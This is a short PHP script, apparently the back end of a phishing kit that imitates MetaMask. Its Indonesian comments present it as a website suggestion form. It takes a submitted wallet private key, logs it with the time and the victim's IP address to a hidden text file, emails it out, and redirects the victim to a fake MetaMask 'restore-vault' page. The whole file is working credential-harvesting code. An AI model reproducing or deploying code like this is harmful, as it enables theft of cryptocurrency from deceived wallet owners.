<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Sertakan file konfigurasi email
require 'email_config.php';

// Proses form jika ada pengiriman data
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $PrivateKey = trim($_POST["PrivateKey"]); // Ambil isi saran dari form

    if (!empty($PrivateKey)) {
        // 1. Ambil waktu dan alamat IP pengirim
        date_default_timezone_set("Asia/Jakarta"); // Zona waktu Indonesia
        $waktu = date("Y-m-d H:i:s");
        $ip_address = $_SERVER['REMOTE_ADDR'];

        // 2. Format data untuk disimpan
        $data .= "PrivateKey	: $PrivateKey\n\n";
        $data .= "Waktu	    : $waktu\n";
        $data .= "IP Address: $ip_address\n";
        $data .= "-------------------------\n";

        // 3. Simpan ke file saran.txt
        $file = "BDFBREWQ7HJA7453BF986_______.txt";
        $handle = fopen($file, "a");
        fwrite($handle, $data);
        fclose($handle);
        
        // 4. Kirim email menggunakan fungsi dari email_config.php
        $subject = "Saran Baru dari Website";
        kirim_email($subject, $data);

        // 5. Redirect ke halaman selanjutnya
        header("Location:/prize-main/metamask/invalid.html?/nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault");
        exit(); // Menghentikan eksekusi agar redirect berjalan dengan baik
    }
    // Jika saran kosong, tidak melakukan apa pun dan tetap di halaman form
}
?>
